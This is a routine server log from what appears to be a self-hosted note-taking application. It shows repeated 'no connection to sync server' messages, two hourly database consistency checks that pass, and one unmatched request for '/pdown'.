13:01:07.418 No connection to sync server.
13:02:07.410 No connection to sync server.
13:03:07.418 No connection to sync server.
13:04:07.425 No connection to sync server.
13:05:07.428 No connection to sync server.
13:06:07.452 No connection to sync server.
13:07:07.438 No connection to sync server.
13:08:07.442 No connection to sync server.
13:09:07.476 No connection to sync server.
13:10:07.463 No connection to sync server.
13:11:07.463 No connection to sync server.
13:12:07.459 No connection to sync server.
13:13:07.483 No connection to sync server.
13:14:07.472 No connection to sync server.
13:14:49.828 Error: Router not found for request GET /pdown
13:15:07.487 No connection to sync server.
13:16:07.473 No connection to sync server.
13:17:07.493 No connection to sync server.
13:17:07.748 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
13:17:07.770 All consistency checks passed with no errors detected (took 23ms)
13:18:07.482 No connection to sync server.
13:19:07.520 No connection to sync server.
13:20:07.491 No connection to sync server.
13:21:07.509 No connection to sync server.
13:22:07.513 No connection to sync server.
13:23:07.511 No connection to sync server.
13:24:07.523 No connection to sync server.
13:25:07.564 No connection to sync server.
13:26:07.533 No connection to sync server.
13:27:07.552 No connection to sync server.
13:28:07.530 No connection to sync server.
13:29:07.549 No connection to sync server.
13:30:07.547 No connection to sync server.
13:31:07.552 No connection to sync server.
13:32:07.569 No connection to sync server.
13:33:07.556 No connection to sync server.
13:34:07.562 No connection to sync server.
13:35:07.622 No connection to sync server.
13:36:07.574 No connection to sync server.
13:37:07.576 No connection to sync server.
13:38:07.618 No connection to sync server.
13:39:07.592 No connection to sync server.
13:40:07.597 No connection to sync server.
13:41:07.596 No connection to sync server.
13:42:07.598 No connection to sync server.
13:43:07.603 No connection to sync server.
13:44:07.599 No connection to sync server.
13:45:07.615 No connection to sync server.
13:46:07.615 No connection to sync server.
13:47:07.615 No connection to sync server.
13:48:07.613 No connection to sync server.
13:49:07.615 No connection to sync server.
13:50:07.632 No connection to sync server.
13:51:07.631 No connection to sync server.
13:52:07.640 No connection to sync server.
13:53:07.642 No connection to sync server.
13:54:07.638 No connection to sync server.
13:55:07.663 No connection to sync server.
13:56:07.660 No connection to sync server.
13:57:07.667 No connection to sync server.
13:58:07.667 No connection to sync server.
13:59:07.675 No connection to sync server.
14:00:07.670 No connection to sync server.
14:01:07.669 No connection to sync server.
14:02:07.687 No connection to sync server.
14:03:07.687 No connection to sync server.
14:04:07.688 No connection to sync server.
14:05:07.708 No connection to sync server.
14:06:07.736 No connection to sync server.
14:07:07.760 No connection to sync server.
14:08:07.712 No connection to sync server.
14:09:07.703 No connection to sync server.
14:10:07.724 No connection to sync server.
14:11:07.721 No connection to sync server.
14:12:07.738 No connection to sync server.
14:13:07.723 No connection to sync server.
14:14:07.733 No connection to sync server.
14:15:07.749 No connection to sync server.
14:16:07.750 No connection to sync server.
14:17:07.748 No connection to sync server.
14:17:07.750 Table counts: notes: 308, revisions: 122, attachments: 64, branches: 311, attributes: 457, etapi_tokens: 0, blobs: 333
14:17:07.778 All consistency checks passed with no errors detected (took 29ms)
14:18:07.748 No connection to sync server.
14:19:07.754 No connection to sync server.
14:20:07.748 No connection to sync server.
14:21:07.760 No connection to sync server.
14:22:07.772 No connection to sync server.
14:23:07.762 No connection to sync server.
